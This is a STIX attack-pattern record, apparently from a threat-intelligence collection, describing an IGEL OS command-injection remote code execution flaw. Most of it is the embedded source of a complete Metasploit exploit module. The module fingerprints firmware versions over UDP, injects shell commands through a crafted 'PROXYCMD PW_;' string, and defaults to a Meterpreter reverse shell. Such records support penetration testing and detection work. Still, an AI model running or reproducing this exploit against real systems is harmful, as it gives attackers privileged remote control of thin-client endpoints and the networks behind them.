{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d172290-f128-45a0-930d-0c61ceaa161c",
    "created": "2024-08-14T16:57:46.991103Z",
    "modified": "2024-08-14T16:57:46.991107Z",
    "name": "IGEL OS Secure VNC/Terminal Command Injection RCE",
    "description": " This module exploits a command injection vulnerability in IGEL OS Secure Terminal and Secure Shadow services.  Both Secure Terminal (telnet_ssl_connector - 30022/tcp) and Secure Shadow (vnc_ssl_connector - 5900/tcp) services are vulnerable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/igel_command_injection.rb",
            "external_id": "igel_command_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "https://kb.igel.com/securitysafety/en/isn-2021-01-igel-os-remote-command-execution-vulnerability-41449239.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.igel.com/wp-content/uploads/2021/02/lxos_11.04.270.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IGEL OS Secure VNC/Terminal Command Injection RCE',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in IGEL OS Secure Terminal\n          and Secure Shadow services.\n\n          Both Secure Terminal (telnet_ssl_connector - 30022/tcp) and Secure\n          Shadow (vnc_ssl_connector - 5900/tcp) services are vulnerable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Rob Vinson',         # Discovery\n          'James Brytan',       # Research and testing\n          'James Smith',        # Research and testing\n          'Marisa Mack',        # Research and testing\n          'Sergey Pashevkin',   # Research and testing\n          'Steven Laura'        # Research and testing\n        ],\n        'References' => [\n          [ 'URL', 'https://kb.igel.com/securitysafety/en/isn-2021-01-igel-os-remote-command-execution-vulnerability-41449239.html' ],\n          [ 'URL', 'https://www.igel.com/wp-content/uploads/2021/02/lxos_11.04.270.txt' ]\n        ],\n        'Platform' => ['linux'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [\n          [\n            'Secure Terminal Service',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :cmd,\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp', 'RPORT' => 30022 }\n            }\n          ],\n          [\n            'Secure Shadow Service',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :cmd,\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp', 'RPORT' => 5900 }\n            }\n          ],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2021-02-25',\n        'CmdStagerFlavor' => ['printf'],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PrependFork' => true\n        },\n        'Notes' => {\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE]\n        }\n      )\n    )\n\n    register_advanced_options(\n      [\n        # must enable SSL\n        OptBool.new('SSL', [ true, 'Negotiate SSL/TLS for outgoing connections', true]),\n      ]\n    )\n  end\n\n  def check\n    probe = '<igel_scan></igel_scan>'\n\n    connect_udp(true, 'RPORT' => 30005)\n    udp_sock.put(probe)\n    res = udp_sock.recvfrom(65535, 0.5)\n    disconnect_udp\n\n    unless res && res[0]\n      return Exploit::CheckCode::Unknown\n    end\n\n    probe_response = res[0]\n    matches = probe_response.match(/firmwareversion=<([0-9.]+)>/)\n    unless matches\n      return Exploit::CheckCode::Unknown\n    end\n\n    version = matches.captures[0]\n    vprint_status(\"IGEL OS Version: #{version}\")\n    version = Rex::Version.new(version)\n\n    if version < Rex::Version.new('10.06.220') && version >= Rex::Version.new('10.0.0')\n      return Exploit::CheckCode::Appears\n    elsif version < Rex::Version.new('11.04') && version >= Rex::Version.new('11.03.620')\n      return Exploit::CheckCode::Safe\n    elsif version < Rex::Version.new('11.04.270') && version >= Rex::Version.new('11.0.0')\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"executing: #{cmd}\")\n    connect\n    sock.put(%(PROXYCMD PW_;/usr/bin/systemd-run --scope bash -c \"#{cmd}\";false))\n  ensure\n    disconnect\n  end\n\n  def exploit\n    execute_cmdstager(linemax: 150, noconcat: true, delay: 2)\n  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n    fail_with(Failure::Unreachable, \"Failed executing payload with error #{e}.\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-02-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}